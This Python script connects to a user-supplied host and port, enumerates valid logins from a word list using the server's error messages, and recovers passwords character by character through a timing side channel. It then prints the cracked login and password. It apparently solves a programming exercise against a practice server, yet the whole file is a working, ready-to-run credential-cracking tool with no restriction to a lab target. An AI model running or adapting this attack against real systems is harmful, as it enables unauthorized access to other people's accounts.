import argparse
import json
import socket
from time import time

digits = "0123456789"
letters = "abcdefghijklmnopqrstuvwxyz"

parser = argparse.ArgumentParser()
parser.add_argument("hostname")
parser.add_argument("port")

args = parser.parse_args()


def hack_password(login, password):
    hack_socket.send(json.dumps({
        "login": login,
        "password": password
    }).encode())
    buffer_size = 1024
    
    start = time()
    response = json.loads(hack_socket.recv(buffer_size).decode())
    end = time()
    if response["result"] == "Connection success!":
        return 1
    elif end - start >= 0.09:
        return 2
    
    return 0


def hack_login(login):
    hack_socket.send(json.dumps({
        "login": login,
        "password": ' '
    }).encode())
    buffer_size = 1024
    response = json.loads(hack_socket.recv(buffer_size).decode())
    if response["result"] == "Wrong password!":
        return True
    return False


with socket.socket() as hack_socket:
    hack_socket.connect((args.hostname, int(args.port)))
    found = False
    
    with open('logins.txt', 'r') as file:
        for login in file.readlines():
            login = login.strip()
            true_password = ""
            if hack_login(login):
                while not found:
                    if len(true_password) > 10:
                        break
                    for char in digits + letters + letters.upper():
                        password = true_password + char
                        hack_result = hack_password(login, password)
                        if hack_result == 1:
                            true_password = password
                            found = True
                            break
                        elif hack_result == 2:
                            true_password = password
                            break
            if found:
                print(json.dumps({
                    "login": login,
                    "password": true_password
                }))
                break
